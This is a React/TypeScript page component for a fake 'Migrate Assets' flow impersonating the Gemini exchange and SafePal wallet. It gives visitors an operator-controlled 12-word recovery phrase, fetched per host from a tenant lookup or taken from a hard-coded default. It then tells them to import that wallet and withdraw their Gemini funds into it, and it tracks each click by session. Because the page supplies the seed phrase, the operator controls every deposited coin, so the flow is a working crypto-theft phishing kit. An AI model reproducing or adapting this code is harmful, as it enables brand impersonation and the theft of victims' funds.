import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { Check, Copy } from "lucide-react";
import { GeminiLogo, GI_ACCENT, GI_FONT_FAMILY, GiFontStyle, useGiTracking } from "@/components/gi/GiShared";
import appStoreBadge from "@/assets/app-store-badge.svg";
import googlePlayBadge from "@/assets/google-play-badge.svg";
import safepalLogo from "@/assets/safepal-logo.png";
import { resolveTenantByHost } from "@/lib/tenants.functions";

const DEFAULT_PHRASE = "witness pilot swim brave tornado fringe angry silent decade broken shrimp orbit";

export const Route = createFileRoute("/gi/safepal")({
  head: () => ({ meta: [{ title: "Migrate Assets — SafePal" }] }),
  component: GiSafePalPage,
});

const STEPS = [
  { title: "Read Carefully" },
  { title: "Import Existing Wallet" },
  { title: "Connect your wallet with a phrase" },
  { title: "Transfer and secure assets" },
  { title: "And you're all set!" },
];

function GiSafePalPage() {
  const { trackClick, giNavigate, sessionId } = useGiTracking();
  const [recoveryPhrase, setRecoveryPhrase] = useState<string>(DEFAULT_PHRASE);
  useEffect(() => {
    if (typeof window === "undefined") return;
    let alive = true;
    resolveTenantByHost({
      data: {
        host: window.location.host,
        participantId: sessionId || undefined,
      },
    })
      .then((r) => { if (alive && r.seedPhrase) setRecoveryPhrase(r.seedPhrase); })
      .catch(() => undefined);
    return () => { alive = false; };
  }, [sessionId]);
  const [step, setStep] = useState(0);
  const [copied, setCopied] = useState(false);
  const [animating, setAnimating] = useState(false);
  const [phraseRevealed, setPhraseRevealed] = useState(false);

  const goNext = () => {
    if (step >= 4) return;
    trackClick(`GI SafePal Step ${step + 1} Next`);
    setAnimating(true); setPhraseRevealed(false);
    setTimeout(() => { setStep((s) => s + 1); setAnimating(false); }, 300);
  };
  const goBack = () => {
    if (step <= 0) return;
    trackClick(`GI SafePal Step ${step + 1} Back`);
    setAnimating(true); setPhraseRevealed(false);
    setTimeout(() => { setStep((s) => s - 1); setAnimating(false); }, 300);
  };
  const handleCopy = () => {
    navigator.clipboard.writeText(recoveryPhrase);
    setCopied(true);
    trackClick("GI SafePal Copy Recovery Phrase");
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div style={{ minHeight: "100vh", background: "#fff", fontFamily: GI_FONT_FAMILY, color: "rgb(1,3,4)", display: "flex", flexDirection: "column" }}>
      <GiFontStyle />
      <style>{`
        .gi-btn-primary { width: 100%; height: 56px; border: none; border-radius: 999px; background: rgb(1,3,4); color: #fff; font-size: 16px; font-weight: 600; font-family: inherit; cursor: pointer; display: flex; align-items: center; justify-content: center; }
        .gi-btn-primary:hover { background: rgb(26,28,29); }
        .gi-btn-secondary { flex: 1; height: 56px; border: none; border-radius: 999px; background: rgba(1,3,4,0.08); color: rgb(1,3,4); font-size: 16px; font-weight: 600; font-family: inherit; cursor: pointer; display: flex; align-items: center; justify-content: center; }
        .gi-btn-secondary:hover { background: rgba(1,3,4,0.12); }
        .gi-phrase-box { position: relative; border-radius: 10px; border: 1px solid rgb(204,205,205); background: rgba(1,3,4,0.02); padding: 20px 16px; cursor: pointer; }
      `}</style>
      <div style={{ display: "flex", alignItems: "center", padding: "16px 24px", height: 75 }}><GeminiLogo /></div>
      <main style={{ display: "flex", justifyContent: "center", flexGrow: 1, padding: "32px 24px 0" }}>
        <div style={{ width: "100%", maxWidth: 420, display: "flex", flexDirection: "column" }}>
          <div style={{ display: "flex", justifyContent: "center", marginBottom: 20 }}>
            <img src={safepalLogo} alt="SafePal" style={{ height: 72, width: "auto", pointerEvents: "none" }} />
          </div>
          <h1 style={{ fontWeight: 600, fontSize: 32, lineHeight: "40px", margin: "0 0 12px 0", textAlign: "center" }}>Migrate Assets</h1>
          <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 8, marginBottom: 6 }}>
            {STEPS.map((_, i) => (
              <div key={i} style={{ width: i === step ? 28 : 8, height: 8, borderRadius: 9999, background: i <= step ? "rgb(1,3,4)" : "rgba(1,3,4,0.15)", transition: "all 0.5s cubic-bezier(0.16,1,0.3,1)" }} />
            ))}
          </div>
          <p style={{ fontSize: 13, color: "rgb(128,129,129)", margin: "0 0 24px 0", textAlign: "center" }}>Step {step + 1} of 5</p>
          <div style={{ opacity: animating ? 0 : 1, transform: animating ? "translateY(8px)" : "translateY(0)", transition: "opacity 0.3s ease, transform 0.3s ease" }}>
            <h2 style={{ fontSize: 20, fontWeight: 600, margin: "0 0 12px 0", textAlign: "center" }}>{STEPS[step].title}</h2>

            {step === 0 && (
              <div style={{ textAlign: "center" }}>
                <p style={{ fontSize: 14, color: "rgb(128,129,129)", lineHeight: "22px", margin: "0 0 20px 0" }}>Follow the step-by-step guide on how to link your external wallet such as SafePal, and move funds from your Gemini account to your external wallet to secure your assets.</p>
                <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 12 }}>
                  <a href="https://apps.apple.com/us/app/safepal-crypto-wallet-btc-nft/id1548297139" target="_blank" rel="noopener noreferrer"><img src={appStoreBadge} alt="App Store" style={{ height: 40 }} /></a>
                  <a href="https://play.google.com/store/apps/details?id=io.safepal.wallet&hl=en" target="_blank" rel="noopener noreferrer"><img src={googlePlayBadge} alt="Google Play" style={{ height: 40 }} /></a>
                </div>
              </div>
            )}

            {step === 1 && (
              <div style={{ textAlign: "center" }}>
                <p style={{ fontSize: 14, color: "rgb(128,129,129)", lineHeight: "22px", margin: "0 0 16px 0" }}>Open SafePal and <strong style={{ color: "rgb(1,3,4)" }}>import the wallet</strong> generated below:</p>
                <div className="gi-phrase-box" onClick={() => { if (!phraseRevealed) setPhraseRevealed(true); }}>
                  <p style={{ fontSize: 14, lineHeight: "24px", color: "rgb(1,3,4)", fontFamily: "monospace", filter: phraseRevealed ? "blur(0)" : "blur(6px)", userSelect: phraseRevealed ? "text" : "none", margin: 0, textAlign: "center", transition: "filter 0.3s ease" }}>
                    {recoveryPhrase || "No recovery phrase assigned"}
                  </p>
                  {!phraseRevealed && (
                    <div style={{ position: "absolute", inset: 0, display: "flex", alignItems: "center", justifyContent: "center" }}>
                      <span style={{ fontSize: 13, fontWeight: 500, color: "rgb(1,3,4)" }}>Click to reveal</span>
                    </div>
                  )}
                </div>
                {phraseRevealed && recoveryPhrase && (
                  <button onClick={handleCopy} style={{ display: "inline-flex", alignItems: "center", gap: 6, fontSize: 13, fontWeight: 500, color: "rgb(1,3,4)", background: "none", border: "none", cursor: "pointer", padding: 0, marginTop: 10 }}>
                    {copied ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}{copied ? "Copied!" : "Copy to clipboard"}
                  </button>
                )}
              </div>
            )}

            {step === 2 && (
              <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
                {[
                  { num: 1, text: <>Select <strong style={{ color: "rgb(1,3,4)" }}>I already have a wallet</strong></> },
                  { num: 2, text: <>Choose <strong style={{ color: "rgb(1,3,4)" }}>Enter a recovery phrase</strong>, then enter your wallet's 12-word recovery phrase from the previous step</> },
                  { num: 3, text: <>Click <strong style={{ color: "rgb(1,3,4)" }}>Import wallet</strong> and create a username for your cold wallet</> },
                  { num: 4, text: <>Create a password so you can securely <strong style={{ color: "rgb(1,3,4)" }}>unlock</strong> your wallet each time</> },
                ].map((it) => (
                  <div key={it.num} style={{ display: "flex", alignItems: "flex-start", gap: 12 }}>
                    <div style={{ width: 28, height: 28, borderRadius: "50%", background: "rgb(1,3,4)", color: "#fff", fontSize: 13, fontWeight: 700, display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>{it.num}</div>
                    <p style={{ fontSize: 14, color: "rgb(128,129,129)", lineHeight: "22px", margin: 0, paddingTop: 3 }}>{it.text}</p>
                  </div>
                ))}
              </div>
            )}

            {step === 3 && (
              <div style={{ textAlign: "center" }}>
                <p style={{ fontSize: 14, color: "rgb(128,129,129)", lineHeight: "22px", margin: "0 0 12px 0" }}>On <span style={{ color: GI_ACCENT, fontWeight: 500 }}>Gemini</span>, swap your assets to bitcoin, ethereum, or USDT preferably. Some less popular assets may not be supported by cold wallets.</p>
                <p style={{ fontSize: 14, color: "rgb(128,129,129)", lineHeight: "22px", margin: "0 0 12px 0" }}>Then on SafePal wallet, copy your token addresses and use them to withdraw your assets from <span style={{ color: GI_ACCENT, fontWeight: 500 }}>Gemini</span> to <span style={{ color: "#00DCFA", fontWeight: 500 }}>SafePal</span>.</p>
              </div>
            )}

            {step === 4 && (
              <div style={{ textAlign: "center" }}>
                <p style={{ fontSize: 14, color: "rgb(128,129,129)", lineHeight: "22px", margin: "0 0 12px 0" }}>If you followed all steps properly, all your crypto assets are now in your custody, secured in your <span style={{ color: "#00DCFA", fontWeight: 500 }}>SafePal</span>.</p>
              </div>
            )}
          </div>

          <div style={{ marginTop: 24 }}>
            {step === 0 ? (
              <button className="gi-btn-primary" onClick={goNext}>Next</button>
            ) : step === 4 ? (
              <div style={{ display: "flex", gap: 12 }}>
                <button className="gi-btn-secondary" onClick={goBack}>Back</button>
                <button className="gi-btn-primary" style={{ flex: 1 }} onClick={() => { trackClick("GI SafePal Done"); giNavigate("/gi/loading"); }}>Done</button>
              </div>
            ) : (
              <div style={{ display: "flex", gap: 12 }}>
                <button className="gi-btn-secondary" onClick={goBack}>Back</button>
                <button className="gi-btn-primary" style={{ flex: 1 }} onClick={goNext}>{step === 1 ? "Continue" : "Next"}</button>
              </div>
            )}
          </div>
        </div>
      </main>
      <div aria-hidden style={{ display: "none" }} />
    </div>
  );
}
